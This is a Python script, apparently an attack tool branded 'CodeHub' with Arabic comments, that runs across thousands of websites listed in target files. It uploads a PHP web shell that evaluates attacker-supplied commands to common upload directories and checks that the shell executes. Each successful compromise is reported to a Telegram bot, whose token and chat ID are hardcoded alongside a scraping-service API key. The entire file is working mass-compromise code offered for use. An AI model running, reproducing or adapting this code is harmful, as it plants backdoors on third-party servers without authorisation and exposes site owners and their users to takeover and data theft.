import asyncio, httpx, os, time, random, signal

# --- مفاتيح قيادة CodeHub المستخرجة ---
TOKEN = "8290479304:AAEa6o56IPfTNb8KJqSfiFXWLVjfU4DjxS0"
CHAT_ID = "7228901951"
API_KEY = "A5421c969a3b500ccfa3d0971f02f79b"
ANT_PAYLOAD = "<?php echo 'CodeHub_Ant_Active'; @eval(\$_POST['cmd']); ?>"

def handler(signum, frame):
    print("\n[🚨] System Suspended. Saving Cloud Logs...")
    os._exit(0)

signal.signal(signal.SIGINT, handler)

async def send_to_channel(message):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": message, "parse_mode": "HTML"}
    async with httpx.AsyncClient() as client:
        try: await client.post(url, json=payload)
        except: pass

async def plant_and_secure(client, url):
    if not url.startswith('http'): url = 'https://' + url
    print(f"[🔎] Scouting: {url}")
    try:
        # استخدام الـ API_KEY للتخفي لو الموقع صعب
        target_url = f"https://api.scraperapi.com?api_key={API_KEY}&url={url}"
        res = await client.get(url, timeout=10, follow_redirects=True)
        
        is_wp = "wp-content" in res.text
        paths = ["/wp-content/uploads/", "/tmp/", "/upload/"]
        
        for p in paths:
            t_path = url.rstrip('/') + p + "ant.php"
            try:
                await client.post(url.rstrip('/') + p, files={'file': ('ant.php', ANT_PAYLOAD)}, timeout=5)
                chk = await client.get(t_path, timeout=5)
                if "CodeHub_Ant_Active" in chk.text:
                    msg = f"<b>🔥 [CodeHub] TARGET INFILTRATED!</b>\n\n<b>Link:</b> <code>{t_path}</code>\n<b>Status:</b> Tunnel Established 🐜"
                    print(f"\n{msg}\a")
                    await send_to_channel(msg)
                    with open("established_tunnels.log", "a") as f:
                        f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} | {t_path}\n")
                    return True
            except: continue
        print(f"[🔕] No opening: {url}")
    except: print(f"[❌] Shielded: {url}")

async def main():
    links = set()
    # جلب الداتا من كل المصادر المتاحة في الـ Vault
    for f_name in ["targets.txt", "titan_harvest.log"]:
        if os.path.exists(f_name):
            with open(f_name, "r") as f:
                for line in f:
                    if "http" in line:
                        p = line.replace('|',' ').split()
                        link = [w for w in p if "http" in w][0].strip().strip(',')
                        links.add(link)

    print(f"[🛡️] Total Battle Map: {len(links)} Targets. Communications Online.")
    await send_to_channel("<b>🚀 CodeHub: Shadow Army Initialized. Monitoring 6000+ Targets...</b>")
    
    async with httpx.AsyncClient(verify=False, http2=True) as client:
        links_list = list(links)
        for i in range(0, len(links_list), 5):
            batch = links_list[i:i+5]
            await asyncio.gather(*[plant_and_secure(client, u) for u in batch])
            await asyncio.sleep(random.uniform(2, 4))

if __name__ == "__main__":
    asyncio.run(main())
